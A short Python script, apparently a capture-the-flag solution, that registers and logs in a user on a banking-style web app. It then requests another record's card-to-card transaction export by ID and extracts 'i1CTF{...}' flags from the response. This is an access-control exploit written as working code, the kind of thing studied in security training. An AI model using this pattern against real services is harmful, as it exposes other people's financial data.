#!/usr/bin/env python
import requests
import re
import logging
from const import *
logging.basicConfig()
log = logging.getLogger(__file__)
log.setLevel(logging.DEBUG)

def reg_user(uname, pw):
  r = s.post(BASE_URL + "/register", data={ 'username' : uname, 'password' : pw })

  if r.status_code != 200:
    log.error("error registering user")
    return None

def login_user(uname, pw):
  r = s.post(BASE_URL + "/login", data={ 'username' : uname, 'password' : pw })
  if r.status_code != 200:
    log.error("error logging in user")
    return None

def main():

  uname = "hackerzzz2"
  pw = "123456"
  reg_user(uname, pw)
  login_user(uname, pw)
  supp_transactions = s.post(BASE_URL + "/card2card/export", data={ 'export': 'XML', 'id': '1'})
  flags = re.findall("i1CTF{.*?}", supp_transactions.content)
  for f in flags:
      print("FLAG -> " + f)

if __name__=="__main__":
  s = requests.session()
  main()
